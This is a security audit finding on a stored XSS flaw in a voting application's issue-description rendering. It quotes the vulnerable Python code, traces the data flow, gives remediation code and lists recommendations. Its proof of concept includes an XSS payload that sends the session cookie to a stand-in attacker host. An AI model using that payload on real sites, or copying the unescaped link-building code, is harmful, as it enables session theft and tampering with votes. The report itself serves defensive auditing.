## Findings

### Critical Severity

#### ASVS-122-CRI-001 — Stored XSS via Unencoded Untrusted Data in Dynamically Built URL

**Severity:** Critical  
**Gap Type:** Type A — Entry point with NO control  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Location:**
- **File:** `v3/server/pages.py`
- **Function:** `rewrite_description`
- **Lines:** 55–63
- **Rendered in:** `v3/server/templates/vote-on.ezt` (within `[issues.description]` output)

**Related Functions Checked:**
- `do_add_issue_endpoint()` — Entry point for issue creation
- `vote_on_page()` — Retrieval and display of issues
- `election.add_issue()` — Database persistence (election.py:~200)
- `election.list_issues()` — Issue retrieval

**Description:**

The `rewrite_description()` function dynamically builds URLs by extracting filenames from user-controlled issue descriptions using the pattern `doc:filename`. These filenames are inserted directly into `href` attributes without URL encoding or HTML attribute encoding, creating a stored XSS vulnerability.

**Vulnerable Code:**

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description
    # Replace doc:filename with <a> link
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'  # ← No URL encoding, no HTML attribute encoding
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

**Data Flow:**

```
1. Source:   Committer submits form with malicious description → do_add_issue_endpoint (line ~525)
             form.description → election.add_issue(form.title, form.description, ...)

2. Store:    Description persisted to database (election.py:add_issue, line ~200)

3. Retrieve: vote_on_page() → election.list_issues() → rewrite_description(issue)

4. Sink:     f'<a href="/docs/{issue.iid}/{filename}">' — filename is NOT URL-encoded or HTML-attribute-encoded

5. Render:   vote-on.ezt: [issues.description] — EZT renders raw HTML (no auto-escaping)
```

The control (URL encoding / HTML attribute encoding) **does not exist anywhere in this path**. The `filename` captured by regex `doc:([^\s]+)` is injected directly into an `href` attribute and link text.

**Proof of Concept:**

**Step 1:** Authenticated committer creates an issue with description:
```
Please review: doc:x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="
```

**Step 2:** `rewrite_description` regex captures filename:
```
x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="
```

**Step 3:** Generated HTML:
```html
<pre><a href="/docs/a1b2c3d4e5/x"onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"y="">x"onmouseover=...</a></pre>
```

**Step 4:** Browser parses this as:
- `href="/docs/a1b2c3d4e5/x"` — truncated href
- `onmouseover="fetch('https://evil.test/steal?c='+document.cookie)"` — event handler attribute
- `y=""` — harmless extra attribute

**Step 5:** Any voter viewing the election via `/vote-on/<eid>` triggers JavaScript on mouseover, exfiltrating their session cookie.

**Impact:**

- **Stored XSS** in a voting system — attackers can steal session tokens, impersonate voters, or silently modify vote submissions via DOM manipulation
- Affects all voters who view the compromised election's voting page
- The voting context makes this especially sensitive — vote integrity depends on client-side form state
- **Attack feasibility:** Any authenticated committer can create issues on any election (the `### check authz` placeholder at lines ~511, ~536 is not implemented), making this exploitable by any authenticated user against all voters

**Remediation:**

```python
import html
from urllib.parse import quote

def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = html.escape(issue.description)  # HTML-escape the entire description first
    def repl(match):
        filename = match.group(1)
        # URL-encode for path context, HTML-escape for attribute context
        safe_href = html.escape(f'/docs/{issue.iid}/{quote(filename, safe="")}')
        safe_text = html.escape(filename)
        return f'<a href="{safe_href}">{safe_text}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

This applies:
1. `html.escape()` on the full description before regex processing (defense in depth)
2. `urllib.parse.quote()` for URL path encoding of the filename
3. `html.escape()` on the `href` attribute value and link text

## Architecture Observations

### 1. EZT Templating Lacks Auto-Escaping

Unlike Jinja2's `autoescape`, EZT renders values raw by default. The codebase uses `[format "js,html"]` selectively but this requires developers to remember encoding for every output point. The `rewrite_description` function bypasses even this by constructing HTML in Python code that the template then renders raw.

### 2. Python-Side HTML Construction Bypasses Template Encoding

The pattern of building HTML strings in Python (`rewrite_description`) and injecting them into templates defeats any template-layer encoding strategy. All HTML construction should happen in templates where encoding controls are available.

### 3. Authorization Gaps Amplify the Finding

The `### check authz` placeholders throughout `pages.py` mean any committer can create issues in any election. If ownership checks were enforced, the attack surface for this XSS would be limited to election owners affecting their own voters (still bad, but smaller blast radius).

## Recommendations Summary

### Immediate Actions (Critical Priority)

1. **Fix `rewrite_description` XSS vulnerability** — Apply URL encoding and HTML escaping as shown in ASVS-122-CRI-001 remediation. This should be deployed immediately as it affects vote integrity.

### Short-Term Actions (1-3 Months)

2. **Move HTML construction to templates** — Refactor `rewrite_description` to pass structured data (filename, iid) to EZT templates and let templates handle rendering with proper `[format]` directives. This prevents future bypasses of template-layer security controls.

3. **Implement authorization checks** — Complete the `### check authz` placeholders throughout `pages.py` to enforce that only election owners can modify issue descriptions, reducing the attack surface for content injection vulnerabilities.

### Long-Term Actions (Strategic)

4. **Consider templating engine migration** — Evaluate migrating from EZT to a modern templating engine with auto-escaping by default (e.g., Jinja2), which would provide defense-in-depth against HTML injection vulnerabilities.

5. **Establish secure coding guidelines** — Document that all HTML construction must occur in templates, not Python code, and that all dynamic content in URLs must be URL-encoded according to context (path vs. query parameters).
